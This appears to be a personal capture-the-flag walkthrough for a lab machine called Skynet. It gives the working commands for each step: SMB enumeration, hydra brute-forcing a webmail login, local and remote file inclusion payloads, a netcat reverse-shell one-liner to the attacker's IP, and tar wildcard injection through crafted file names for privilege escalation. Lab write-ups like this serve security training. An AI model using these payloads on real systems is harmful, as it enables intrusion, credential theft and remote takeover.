## Enum
```bash
# Nmap 7.92 scan initiated Sat Nov 12 15:29:41 2022 as: nmap -sC -sV -Pn -oN nmap_scan.txt -vv 10.10.66.9
Nmap scan report for 10.10.66.9
Host is up, received user-set (0.037s latency).
Scanned at 2022-11-12 15:29:41 EST for 14s
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Skynet
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE CAPA UIDL SASL PIPELINING RESP-CODES TOP
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
|_imap-capabilities: IMAP4rev1 ENABLE more LITERAL+ have LOGINDISABLEDA0001 post-login listed IDLE capabilities Pre-login OK ID SASL-IR LOGIN-REFERRALS
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m55s, deviation: 3h27m50s, median: -4s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10604/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60487/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57234/udp): CLEAN (Failed to receive data)
|   Check 4 (port 57575/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-12T20:29:49
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-11-12T14:29:49-06:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 12 15:29:55 2022 -- 1 IP address (1 host up) scanned in 14.21 seconds
```

We can see that there is samba shares.
Let's run nmap scripts :
We find user milesdyson and that we can connect as anonymous

```bash
smbmap -H 10.10.66.9             
[+] Guest session       IP: 10.10.66.9:445      Name: 10.10.66.9                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$      

```

let's try to connect to the anonymous share
```bash
smbclient -L \\10.10.66.9
smclient \\\\10.10.66.9\\anonymous
smbclient //10.10.66.9/anonymous -U " "%" "

smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5822448 blocks available

attention.txt : 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

![[Pasted image 20221112221534.png]]

![[Pasted image 20221112221550.png]]

let's use this list to bruteforce the squirrel mail

```bash 
hydra 10.10.66.9 http-form-post "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -P ./log1.txt -l milesdyson -V -I
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-12 16:30:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.66.9:80/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.10.66.9 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.10.66.9   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-12 16:30:58

```

We found the password "cyborg007haloterminator"

![[Pasted image 20221112223419.png]]

In the mail we find the a password rst for SMB

Then connect to smb as milesdyson.

We find the notes directory in which there is *important.txt*
```important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

This is the answer to the secret direcotry.

Now let's do an other gobuster to see the new hidden repository secrets.

![[Pasted image 20221112224627.png]]


We arrive on : 
![[Pasted image 20221112224703.png]]

Let's try the sale credentials or bruteforce :)

Edit ! The smartest way was to find a flaw ...

Local file inclusion flaw...

```code
http://10.10.66.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

we get the passwd file :

```file
Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
```

	Let's try to connect as milesdyson but idk how... maybe as ssh ? But before let's get the user flag !!!!
	http://10.10.66.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt

Now I have to connect and use a privilege esc.  While writing notes,  got hydra running.

I am on the system !
setup a nc listener on the attacker machine and the remote file inclusion a rev php shell :

```
http://10.10.66.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.12.51/php-reverse-shell.php
```

Enumaration on the linux : 
```
www-data@skynet:/$ cat /etc/lsb-release
cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
www-data@skynet:/$ uname -r 
uname -r 
4.8.0-58-generic
```




```cd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.12.51 443 >/tmp/f" > shell.sh 
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```


USING WILDCARDS !!!!!


tar -cvf toto.backup *